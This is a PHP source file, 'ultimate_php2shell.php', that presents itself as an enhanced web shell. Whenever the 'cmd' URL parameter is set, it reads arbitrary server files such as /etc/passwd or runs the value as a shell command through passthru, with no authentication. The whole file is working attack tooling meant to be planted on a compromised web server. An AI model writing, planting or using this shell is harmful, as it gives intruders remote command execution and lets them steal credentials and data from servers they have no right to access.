<?php
/*
 * ultimate_php2shell.php
 * Enhanced version of hoed/php2shell.
 * Features:
 * 1. File Reading: If ?cmd=/etc/passwd, it reads the file.
 * 2. Command Execution: If ?cmd=ls -la, it executes the command.
 * 3. Output Buffering: Cleaner output display.
 */
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];

    // Check if the input looks like a file path
    if (preg_match('/^\//', $command) && !preg_match('/[^\w\-\/]/', $command)) {
        // Attempt to read the file
        if (file_exists($command)) {
            // Read file content and display with syntax highlighting if text
            $content = file_get_contents($command);
            header('Content-Type: text/plain');
            echo "<pre>" . htmlspecialchars($content) . "</pre>";
        } else {
            echo "[-] File not found: " . $command;
        }
    } else {
        // Execute shell command
        ob_start();
        passthru($command);
        $output = ob_get_clean();

        if (!empty($output)) {
            echo "<pre>" . htmlspecialchars($output) . "</pre>";
        } else {
            echo "[-] Command executed with no output or access denied.";
        }
    }
}
?>